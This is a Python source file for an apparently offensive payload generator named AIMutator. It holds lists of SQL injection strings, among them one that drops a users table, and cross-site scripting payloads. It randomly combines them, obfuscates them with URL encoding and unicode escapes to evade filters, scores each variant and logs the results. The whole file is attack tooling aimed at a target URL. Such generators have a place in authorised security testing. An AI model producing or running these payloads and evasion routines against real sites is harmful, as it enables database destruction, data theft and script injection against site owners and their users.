import random
import hashlib
import json
from pathlib import Path
from scoring.scoring_engine import score_payload

class AIMutator:
    def __init__(self, target_url):
        self.target_url = target_url
        self.history = []
        self.base_sql = ["' OR 1=1 --", "'; DROP TABLE users; --", "' UNION SELECT null --"]
        self.base_xss = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"]
        self.obfuscate_map = {"'": "%27", "<": "%3C", ">": "%3E", "=": "%3D", ";": "%3B", "script": "\\u0073cript"}

    def _obfuscate(self, payload):
        for key, val in self.obfuscate_map.items():
            payload = payload.replace(key, val)
        return payload

    def _combine_payloads(self, sql, xss):
        return f"{sql} {xss}"

    def generate_payloads(self, count=15):
        results = []
        for _ in range(count):
            sql = random.choice(self.base_sql)
            xss = random.choice(self.base_xss)
            base = self._combine_payloads(sql, xss)
            obf = self._obfuscate(base)
            variant = random.choice([base, obf])

            cat = "SQLi+XSS"
            scored = score_payload(variant, category=cat)
            results.append(scored)
            print(f"[+] {variant} → Score: {scored['score']}")
        self.history.extend(results)
        return results

    def log_session(self):
        sid = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
        path = Path(f"logs/ai_mut_{sid}.json")
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w") as f:
            json.dump(self.history, f, indent=2)
